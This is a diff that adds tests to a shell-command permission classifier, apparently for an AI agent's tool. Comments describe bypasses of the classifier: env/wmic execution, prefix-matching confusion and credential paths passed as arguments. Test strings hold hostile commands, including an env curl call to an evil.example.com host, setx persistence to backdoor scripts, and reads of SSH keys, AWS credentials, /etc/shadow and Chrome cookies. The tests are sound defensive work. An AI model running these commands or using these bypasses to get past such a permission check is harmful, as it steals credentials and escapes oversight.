@@ -109,3 +109,115 @@ def test_newline_after_safe_prefix_is_not_read_only():
 def test_crlf_after_safe_prefix_is_not_read_only():
     result = classify_command("dir\r\nnpm publish --access public")
     assert result.category == PermissionLevel.DESTRUCTIVE
+
+
+# ============================================================================
+# LOLBIN prefixes: a bare invocation of "env"/"wmic" is read-only, but both
+# become a general command-execution primitive the instant they're given
+# the right argument. A plain startswith("env")/startswith("wmic") prefix
+# match can't tell the two apart. Found by testing, confirmed via the real
+# PolicyEngine: "env whoami", "env rm important_file.txt", and
+# "wmic process call create \"calc.exe\"" all evaluated to ALLOW with zero
+# confirmation before this was fixed.
+# ============================================================================
+
+def test_env_with_command_argument_is_not_read_only():
+    for cmd in ("env whoami", "env rm important_file.txt", "env curl http://evil.example.com/x"):
+        result = classify_command(cmd)
+        assert result.category != PermissionLevel.READ, cmd
+        assert not result.denied, cmd  # gated (requires approval), not silently denied
+
+
+def test_bare_env_is_still_read_only():
+    assert classify_command("env").category == PermissionLevel.READ
+    assert classify_command("env -i").category == PermissionLevel.READ
+
+
+def test_wmic_process_call_create_is_not_read_only():
+    result = classify_command('wmic process call create "calc.exe"')
+    assert result.category != PermissionLevel.READ
+
+
+def test_bare_wmic_query_is_still_read_only():
+    assert classify_command("wmic os get caption").category == PermissionLevel.READ
+    assert classify_command("wmic diskdrive get model,size").category == PermissionLevel.READ
+
+
+def test_systeminfo_and_tasklist_with_remote_target_are_not_read_only():
+    # /s /u /p query a REMOTE machine with supplied credentials --
+    # remote-login/lateral-movement recon, not a local read.
+    assert classify_command("systeminfo /s remotehost /u admin /p password").category != PermissionLevel.READ
+    assert classify_command("tasklist /s remotehost /u admin /p password").category != PermissionLevel.READ
+
+
+def test_bare_systeminfo_and_tasklist_are_still_read_only():
+    assert classify_command("systeminfo").category == PermissionLevel.READ
+    assert classify_command("tasklist").category == PermissionLevel.READ
+
+
+def test_setx_persists_arbitrary_variables_not_just_path():
+    # PYTHONSTARTUP/NODE_OPTIONS/BASH_ENV make the OS run arbitrary code on
+    # every future interpreter/shell start -- a real persistence technique,
+    # not something scoped to "setx path" alone.
+    for cmd in (
+        "setx MALICIOUS_VAR evil_value",
+        "setx PYTHONSTARTUP C:\\evil\\backdoor.py",
+        "setx NODE_OPTIONS --require=C:\\evil\\backdoor.js",
+    ):
+        result = classify_command(cmd)
+        assert result.category == PermissionLevel.DESTRUCTIVE, cmd
+
+
+# ============================================================================
+# Word-boundary prefix matching: a bare startswith() let a longer, unrelated
+# command that merely shares a text prefix slip through as though it were
+# the short safe command with more arguments. Found by testing.
+# ============================================================================
+
+def test_longer_unrelated_command_sharing_a_read_prefix_is_not_read_only():
+    cases = [
+        "hostnamectl set-hostname evil-host",  # not "hostname"
+        "typeperf \"x\" -o C:\\evil\\output.csv",  # not "type"
+        "cdrecord dev=/dev/sr0 evil.iso",  # not "cd"
+    ]
+    for cmd in cases:
+        result = classify_command(cmd)
+        assert result.category != PermissionLevel.READ, cmd
+
+
+def test_bare_prefix_commands_still_classify_correctly_after_boundary_fix():
+    assert classify_command("hostname").category == PermissionLevel.READ
+    assert classify_command("cd /tmp").category == PermissionLevel.READ
+    assert classify_command("md newdir").category == PermissionLevel.MODIFY
+    assert classify_command("cp a b").category == PermissionLevel.MODIFY
+
+
+# ============================================================================
+# Credential-path fragments embedded as a COMMAND ARGUMENT (rather than the
+# tool's cwd/paths field) must still be denied. execute_command's
+# build_request() only ever puts `cwd` into request.paths, so a path
+# referenced inside the command string itself was invisible to
+# denied_path() entirely. Found by testing, confirmed via the real
+# PolicyEngine: "cat ~/.ssh/id_rsa" (and the AWS/npm/Chrome-cookie
+# equivalents) evaluated to ALLOW with zero confirmation.
+# ============================================================================
+
+def test_credential_path_referenced_as_command_argument_is_denied():
+    cases = [
+        "cat ~/.ssh/id_rsa",
+        "cat /home/user/.aws/credentials",
+        "type C:\\Users\\bob\\.ssh\\id_rsa",
+        "cat ~/.npmrc",
+        "cat /etc/shadow",
+        'get-content "C:\\Users\\bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"',
+    ]
+    for cmd in cases:
+        result = classify_command(cmd)
+        assert result.denied, cmd
+
+
+def test_ordinary_file_reads_are_unaffected_by_credential_path_check():
+    for cmd in ("cat README.md", "type notes.txt", "cat /home/user/projects/app/main.py"):
+        result = classify_command(cmd)
+        assert not result.denied, cmd
+        assert result.category == PermissionLevel.READ, cmd
